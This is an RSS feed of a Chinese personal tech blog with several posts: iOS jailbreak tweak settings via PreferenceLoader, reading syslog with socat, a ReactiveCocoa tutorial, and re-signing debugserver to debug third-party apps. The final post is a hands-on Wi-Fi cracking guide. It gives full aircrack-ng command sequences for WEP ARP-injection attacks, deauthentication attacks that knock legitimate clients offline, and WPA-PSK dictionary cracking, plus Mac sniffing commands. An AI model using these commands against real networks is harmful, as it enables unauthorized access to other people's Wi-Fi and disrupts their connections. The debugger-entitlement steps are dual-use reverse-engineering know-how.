在网上找了找可以把插件和App打包成deb安装，这样通过App来控制，不过很麻烦，都要自己来处理。&lt;/p&gt;

&lt;p&gt;后来在网上找到一篇教程https://github.com/yohunl/FlexInjected 里面讲到一个&lt;a href=&quot;https://github.com/DHowett/preferenceloader&quot;&gt;PreferenceLoader&lt;/a&gt;可以很方便的在系统设置里面给我们的插件添加一个开关，可以选择对哪些App启用插件。而且这个插件是很多越狱软件依赖插件，基本都装的有，我们只管用就行了。&lt;/p&gt;

&lt;p&gt;这个地方要新建一个tweak工程，通过新建的这个工程来控制。
&lt;a href=&quot;https://github.com/DHowett/preferenceloader&quot;&gt;PreferenceLoader&lt;/a&gt;的使用非常简单。只需要在工程根目录新建一个layout文件件，按照要求放入需要的文件就行了.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;layout/Library/Application Support&lt;/code&gt;下面放上面生成的&lt;code class=&quot;highlighter-rouge&quot;&gt;dylib&lt;/code&gt;文件，这个文件&lt;code class=&quot;highlighter-rouge&quot;&gt;dylib&lt;/code&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;.theos/_/Library/MobileSubstrate/DynamicLibraries&lt;/code&gt;里面，反正我是在这里弄得，其他地方好像也有，我就不去找了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/img/in-post/dynamiclibraries.png&quot; alt=&quot;dylib文件在这里&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;layout/Library/PreferenceLoader/Preferences&lt;/code&gt;里面是关于设置界面的一些配置，一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件和图标，图标就不说了。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;主要是这几个地方要改成你自己的，当然XM文件里面的地址也要对应的修改。
&lt;img src=&quot;http://localhost:4000/img/in-post/plist.png&quot; alt=&quot;Plist文件修改&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后弄完是这样的
&lt;img src=&quot;http://localhost:4000/img/in-post/F2D93245-2CBA-46B6-8FBB-12F4D7528906.png&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/img/in-post/preferences.png&quot; alt=&quot;PreferenceLoader&quot; /&gt;&lt;/p&gt;

&lt;p&gt;都弄好了就运行试试吧，出现插件不生效的情况可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;socat&lt;/code&gt;看看打印的日志信息，看看到底有没有成功加载插件。还有什么问题可以看看我的&lt;a href=&quot;https://github.com/YasinTian/ShowOpenUrl&quot;&gt;demo&lt;/a&gt;。&lt;/p&gt;

</description>
        <pubDate>Thu, 01 Jun 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/06/01/UrlScheme%E6%9F%A5%E7%9C%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/06/01/UrlScheme%E6%9F%A5%E7%9C%8B/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>逆向开发%log的问题</title>
        <description>&lt;p&gt;&lt;a href=&quot;http://bbs.iosre.com/t/ios-socat/139&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;看了许多文章说%log会在/var/log/syslog日志里，但是我的ios9.3.3的系统怎么都没有发现这个文件。&lt;/p&gt;

&lt;p&gt;网上搜了一下。发现可以按照&lt;a href=&quot;https://www.theiphonewiki.com/wiki/System_Log&quot;&gt;https://www.theiphonewiki.com/wiki/System_Log&lt;/a&gt;里面的方法试一试。&lt;/p&gt;

&lt;p&gt;其中使用&lt;code class=&quot;highlighter-rouge&quot;&gt;socat&lt;/code&gt;的方法使用非常简单方便，推荐使用。&lt;/p&gt;

&lt;h3 id=&quot;socat&quot;&gt;socat&lt;/h3&gt;

&lt;p&gt;我是直接用Cydia安装的，搜索syslogd to /var/log/syslog这个安装就行了。
看别人的文章可以直接用命令安装&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install socat&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;使用就比较简单了&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;显示&lt;code class=&quot;highlighter-rouge&quot;&gt;ASL is here to serve you&lt;/code&gt;说明准备好了，这个时候输入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;watch
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;屏幕上就会打印一大推东西出来。
我们只想看我们&lt;code class=&quot;highlighter-rouge&quot;&gt;Hook&lt;/code&gt;的程序只需要输入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*PID 要看的PID
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;还有其他用法可以输入&lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt;看看其他命令。了解到这里，基本的调试就够用了。&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Mar 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/03/06/%E8%A7%A3%E5%86%B3-log%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97%E4%B8%8D%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/03/06/%E8%A7%A3%E5%86%B3-log%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97%E4%B8%8D%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>ReactiveCocoa快速入门</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveCocoa&quot;&gt;ReactiveCocoa地址&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;从RAC 5.0开始，RAC进行了巨大的变化，现在有了4个独立的库&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveObjC&quot;&gt;ReactiveObjC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveSwift&quot;&gt;ReactiveSwift&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveCocoa&quot;&gt;ReactiveCocoa&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ReactiveCocoa/ReactiveObjCBridge&quot;&gt;ReactiveObjCBridge&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;导入&quot;&gt;导入&lt;/h3&gt;

&lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;cocoapods&lt;/code&gt;导入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    target 'ReactiveCocoa_Demo' do
      pod 'ReactiveCocoa'
    end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;导入头文件&lt;code class=&quot;highlighter-rouge&quot;&gt;#import &amp;lt;ReactiveCocoa.h&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;基本使用&quot;&gt;基本使用&lt;/h3&gt;
&lt;p&gt;我们先试试&lt;code class=&quot;highlighter-rouge&quot;&gt;UIButton&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [[btn rac_signalForControlEvents:UIControlEventTouchUpInside] subscribeNext:^(id x) {
        NSLog(@&quot;ddd&quot;);
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;点击button会打印”ddd”说明，调用了block里面的内容。
看着可能有点复杂，但是不熟的时候可以拆开写&lt;/p&gt;

&lt;p&gt;先创建一个&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;对象，再添加要执行的block。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    RACSignal *racSignal = [btn rac_signalForControlEvents:UIControlEventTouchUpInside];

    [racSignal subscribeNext:^(id x) {
        NSLog(@&quot;ddd&quot;);
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;是RAC里面一个非常重要的概念，建议先掌握了&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;的基本用法后在去了解他的原理。&lt;/p&gt;

&lt;p&gt;再来看看连续多个block的情况，比如已经创建了一个&lt;code class=&quot;highlighter-rouge&quot;&gt;UITextField&lt;/code&gt;叫&lt;code class=&quot;highlighter-rouge&quot;&gt;tf&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    RACSignal *tfRac = [tf rac_textSignal];

    [[tfRac filter:^BOOL(NSNumber*length) {
        return YES;
    }] subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;, x);
    }];

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样当UITextField里面内容变化的时候就会打印出UITextField的内容。&lt;/p&gt;

&lt;h3 id=&quot;filter&quot;&gt;filter&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;filter&lt;/code&gt;是一个过滤器里面能加一些判定条件用于判断是否继续往下面的执行。这样就表示当内容是123的时候才打印&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [[tfRac filter:^BOOL(id value) {
        if([value isEqualToString:@&quot;123&quot;]){//过滤出内容是123的情况
            return YES;
        }
        return NO;
    }] subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;,x);
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;map&quot;&gt;map&lt;/h3&gt;

&lt;p&gt;还有一个常用的操作&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;，在&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;block&lt;/code&gt;里面可以更改要往下传的数据，比如下面的例子，textfield的内容被传入&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;，在&lt;code class=&quot;highlighter-rouge&quot;&gt;block&lt;/code&gt;里面计算了文字长度之后，把文字长度传了下去。后面的block收到的参数就是这个长度值了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    RACSignal *tfRac = [tf rac_textSignal];

    [[[tfRac
       map:^id(NSString*text){
           return @(text.length);//收到数据后转换成内容长度，再往后传
       }]
      filter:^BOOL(NSNumber*length){
          return[length integerValue] &amp;gt; 3;//过滤出长度大于3的
      }]
     subscribeNext:^(id x){
         NSLog(@&quot;%@&quot;, x);
     }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;rac宏&quot;&gt;RAC宏&lt;/h3&gt;
&lt;p&gt;在ReactiveCocoa有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;RAC&lt;/code&gt;宏非常好用,他可以直接把信号的输出应用到对象的属性上。参数1是要绑定的对象，参数2是要绑定的属性。下面的例子，当输入值为”123456”的时候背景颜色就会变成黄色了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    tf.backgroundColor = [UIColor redColor];
    RACSignal *tfRac = [tf rac_textSignal];
    //tf的backgroundColor绑定信号
    RAC(tf,backgroundColor) = [tfRac map:^id(id value) {
        if([value isEqualToString:@&quot;123456&quot;]){
            //如果值为123456返回黄色
            return [UIColor yellowColor];
        }else{
            return [UIColor redColor];
        }
    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;信号聚合&quot;&gt;信号聚合&lt;/h3&gt;
&lt;p&gt;在用些时候需要聚合信号,&lt;code class=&quot;highlighter-rouge&quot;&gt;RACSignal&lt;/code&gt;提供了&lt;code class=&quot;highlighter-rouge&quot;&gt;combineLatest:reduce:&lt;/code&gt;这个方法可以把任意数量的信号聚合起来。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //信号1
    RACSignal *tfRac = [tf rac_textSignal];
    [tfRac subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;,x);
    }];

    //信号2
    RACSignal *tf1Rac = [tf1 rac_textSignal];
    [tf1Rac subscribeNext:^(id x) {
        NSLog(@&quot;%@&quot;,x);
    }];

    //聚合信号
    [[RACSignal combineLatest:@[tfRac, tf1Rac]
                      reduce:^id(id x, id y){
                      //比较2个输入框的内容是否一样
                          if([x isEqualToString:y]){
                              NSLog(@&quot;一样&quot;);
                              return @1;
                          }else{
                              NSLog(@&quot;不一样&quot;);
                              return @0;
                          }
                      }] subscribeNext:^(id x) {
                          NSLog(@&quot;%@&quot;,x);
                      }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;附加操作&quot;&gt;附加操作&lt;/h3&gt;
&lt;p&gt;有些时候我们可能需要在收到信号后进行一些附加操作，可以添加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;doNext:&lt;/code&gt;block。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    [[tfRac doNext:^(id x) {
    	NSLog(@&quot;附加操作&quot;);
    }] subscribeNext:^(id x) {

    }];
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;参考资料&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/tangchangjiang/p/5598079.html&quot;&gt;ReactiveCocoa - 基础篇&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://benbeng.leanote.com/post/ReactiveCocoaTutorial-part1&quot;&gt;ReactiveCocoa入门教程——第一部分&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://benbeng.leanote.com/post/ReactiveCocoaTutorial-part2&quot;&gt;ReactiveCocoa入门教程——第二部分&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.jianshu.com/p/87ef6720a096&quot;&gt;最快让你上手ReactiveCocoa之基础篇&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.jianshu.com/p/e10e5ca413b7&quot;&gt;最快让你上手ReactiveCocoa之进阶篇&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 18 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/01/18/ReactiveCocoa%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/01/18/ReactiveCocoa%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</guid>
        
        <category>开发</category>
        
        
      </item>
    
      <item>
        <title>lldb调试第三方App</title>
        <description>&lt;p&gt;在iOS逆向工程中，通过class-dump能得到函数头文件，但是一般情况下，参数都是&lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;类型，这时候可以通过调试器打印出来看一下，起到事半功倍的作用。&lt;/p&gt;

&lt;h2 id=&quot;debugserver&quot;&gt;debugserver&lt;/h2&gt;

&lt;p&gt;在连接过&lt;code class=&quot;highlighter-rouge&quot;&gt;XCode&lt;/code&gt;后，XCode会自动给手机安装上&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;是安装在手机端用于接受电脑端传过去的&lt;code class=&quot;highlighter-rouge&quot;&gt;lldb&lt;/code&gt;命令的。执行后再把结果返回给&lt;code class=&quot;highlighter-rouge&quot;&gt;lldb&lt;/code&gt;。
在正常的开发中，&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;是没有&lt;code class=&quot;highlighter-rouge&quot;&gt;task_for_pid&lt;/code&gt;的权限的，所以一般只能调试我们自己的App。但是这样对越狱开发一点用都没有了。但是通过配置我们可以提升&lt;code class=&quot;highlighter-rouge&quot;&gt;debugserver&lt;/code&gt;的权限。&lt;/p&gt;

&lt;h2 id=&quot;配置debugserver&quot;&gt;配置debugserver&lt;/h2&gt;

&lt;h3 id=&quot;debugserver减肥&quot;&gt;debugserver减肥&lt;/h3&gt;

&lt;p&gt;首先将debugserver拷贝到电脑中。命令是&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp root@(手机的ip地址):/Developer/usr/bin/debugserver (要拷贝到的路径)/debugderver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd debugderver文件的路径
lipo -thin arm64 debugserver -output debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;下载&lt;a href=&quot;http://iosre.com/ent.xml&quot;&gt;http://iosre.com/ent.xml&lt;/a&gt;这个文件放到debugderver文件所在的路径。
执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/theos/bin/ldid -Sent.xml debugserver
-S后面是没有空格的
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果长时间没有执行完毕，就只能用另一种方案了。
下载&lt;a href=&quot;http://iosre.com/ent.plist&quot;&gt;http://iosre.com/ent.plist&lt;/a&gt;这个文件
执行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;codesign -s - --entitlements ent.plist -f debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后把修改过的debugserver拷贝回iOS&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp (debugserver的地址)/debugserver root@192.168.5.228:/usr/bin/debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;debugserver我们放在/usr/bin里面可以直接输入debugserver运行。&lt;/p&gt;

&lt;p&gt;ssh连接手机，提升权限&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod +x /usr/bin/debugserver
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;打开调试器&quot;&gt;打开调试器&lt;/h2&gt;

&lt;h3 id=&quot;手机端&quot;&gt;手机端&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;debugserver -x backboard *:1234 /Applications/MobileSMS.app
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这句话表示，打开短信，并且注入调试器。等待来自任意ip的1234端口的&lt;code class=&quot;highlighter-rouge&quot;&gt;lldb&lt;/code&gt;连接&lt;/p&gt;

&lt;h3 id=&quot;电脑端&quot;&gt;电脑端&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/Applications/Xcode.app/Contents/Developer/usr/bin/lldb
process connect connect://192.168.5.228:1234
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样就可以连上了。连接成功后
如果连接上是卡住的状态，好像是连接上回默认被断点卡住，lldb输入c命令就能好。&lt;/p&gt;
</description>
        <pubDate>Thu, 05 Jan 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/01/05/lldb%E5%92%8Cdebugserver%E8%B0%83%E8%AF%95/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/01/05/lldb%E5%92%8Cdebugserver%E8%B0%83%E8%AF%95/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>Mac下的WIFI破解</title>
        <description>&lt;p&gt;以前破wifi用的是CDLinux下的工具，最近换了mac研究了一下mac下的wifi破解工具，速度还行。不过现在到处都是免费wifi，还有好用的万能钥匙，这些技术用的都比较少了，写下来备用吧。&lt;/p&gt;

&lt;h2 id=&quot;一wep破解&quot;&gt;一、wep破解&lt;/h2&gt;

&lt;h3 id=&quot;1载入无线网卡&quot;&gt;1、载入无线网卡&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig -a查看网卡
ifconfig wlan0 up加载网卡
iwconfig只查看无线网卡
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;2激活无线网卡只monitor监听模式&quot;&gt;2、激活无线网卡只monitor监听模式&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airmon-ng start 上面查看的网卡名

monitor mode enabled on mon0便是已启动监听模式，监听模式下适配器名称变更为mon0。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;3探测无线网络抓取无线数据包&quot;&gt;3、探测无线网络，抓取无线数据包&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng mon0 //mon0为之前已经载入并激活监听模式的无线网卡

airodump-ng --ivs –w longas -c 6 wlan0 //抓取数据包
参数解释：
--ivs 这里的设置是通过设置过滤，不再将所有无线数据保存，而只是保存可用于破解的IVS数据报文，这样可以有效地缩减保存的数据包大小；
-c 这里我们设置目标AP的工作频道，通过刚才的观察，我们要进行攻击测试的无线路由器工作频道为6；
-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，如下图10所示我这里就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longase.ivs，而是longas-01.ivs。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;4对目标ap使用arprequest注入攻击加速数据包的获取&quot;&gt;4、对目标AP使用ArpRequest注入攻击，加速数据包的获取&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
参数解释：
-3 指采用ARPRequesr注入攻击模式；
-b 后跟AP的MAC地址，这里就是前面我们探测到的SSID为TPLINK的AP的MAC；
-h 后跟客户端的MAC地址，也就是我们前面探测到的有效无线客户端的MAC；
最后跟上无线网卡的名称，这里就是mon0啦。
在等待片刻之后，一旦成功截获到ARP请求报文，我们将会看到如下图13所示的大量ARP报文快速交互的情况出现。
此时回到airodump-ng 会看到packets栏的数字在飞速递增。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;5打开aircrack-ng开始破解wep&quot;&gt;5、打开aircrack-ng，开始破解WEP&lt;/h3&gt;

&lt;p&gt;在抓取的无线数据报文达到了一定数量后，一般都是指IVs值达到2万以上时，就可以开始破解，若不能成功就等待数据报文的继续抓取然后多试几次。注意，此处不需要将进行注入攻击的Shell关闭，而是另外开一个Shell进行同步破解。输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng 捕获的ivs文件
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;二wap-psk破解&quot;&gt;二、wap-psk破解&lt;/h2&gt;

&lt;h3 id=&quot;1升级aircrack-ng&quot;&gt;1、升级Aircrack-ng&lt;/h3&gt;

&lt;p&gt;最好对airodump-ng的OUI库进行升级，先进入到Aircrack-ng的安装目录下，然后输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng-oui-update
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;2载入并激活无线网卡至monitor即监听模式&quot;&gt;2、载入并激活无线网卡至monitor即监听模式&lt;/h3&gt;

&lt;p&gt;载入无线网卡的顺序及命令部分，依次输入下述命令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;startx            进入到图形界面
ifconfig –a       查看无线网卡状态
ifconfig  wlan0  up     载入无线网卡驱动
airmon-ng  start  wlan0  激活网卡到monitor模式
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;3探测无线网络抓取无线数据包-1&quot;&gt;3、探测无线网络，抓取无线数据包&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng -c 6 –w longas mon0
参数解释：
-c 这里我们设置目标AP的工作频道，通过观察，我们要进行攻击测试的无线路由器工作频道为6；
-w 后跟要保存的文件名，这里w就是“write写”的意思，所以输入自己希望保持的文件名，这里我就写为longas。那么，小黑们一定要注意的是：这里我们虽然设置保存的文件名是longas，但是生成的文件却不是longas.cap，而是longas-01.cap。
mon0 为之前已经载入并激活监听模式的无线网卡。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;4进行deauth攻击加速破解过程&quot;&gt;4、进行Deauth攻击加速破解过程&lt;/h3&gt;

&lt;p&gt;和破解WEP时不同，这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0 
参数解释：
-0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等；
-a 后跟AP的MAC地址；
-c 后跟客户端的MAC地址；
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;5开始破解wpa-psk&quot;&gt;5、开始破解WPA-PSK&lt;/h3&gt;

&lt;p&gt;在成功获取到无线WPA-PSK验证数据报文后，就可以开始破解，输入命令如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng -w dic 捕获的cap文件 
-w 后跟预先制作的字典，这里是BT4下默认携带的字典。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;命令合集&quot;&gt;命令合集&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng
主要用于WEP及WPA-PSK密码的恢复，只要airodump-ng收集到足够数量的数据包，aircrack-ng就可以自动检测数据包并判断是否可以破解
airmon-ng
用于改变无线网卡工作模式，以便其他工具的顺利使用
airodump-ng
用于捕获802.11数据报文，以便于aircrack-ng破解
aireplay-ng
在进行WEP及WPA-PSK密码恢复时，可以根据需要创建特殊的无线网络数据报文及流量
airserv-ng
可以将无线网卡连接至某一特定端口，为攻击时灵活调用做准备
airolib-ng
进行WPA Rainbow Table攻击时使用，用于建立特定数据库文件
airdecap-ng
用于解开处于加密状态的数据包
tools
其他用于辅助的工具，如airdriver-ng、packetforge-ng等
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;破解wifi密码总结&quot;&gt;破解WIFI密码总结&lt;/h1&gt;

&lt;p&gt;这里我总结一下常用的流程，其实只有3个步骤。&lt;/p&gt;

&lt;h3 id=&quot;获取搜索到的wifi&quot;&gt;获取搜索到的wifi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airport -s
SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;开始监听&quot;&gt;开始监听&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo airport en0 sniff 1
en0是网卡   1是要抓包的信道
抓包.cap文件默认保存在/tmp  -w可以改变保存路径
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

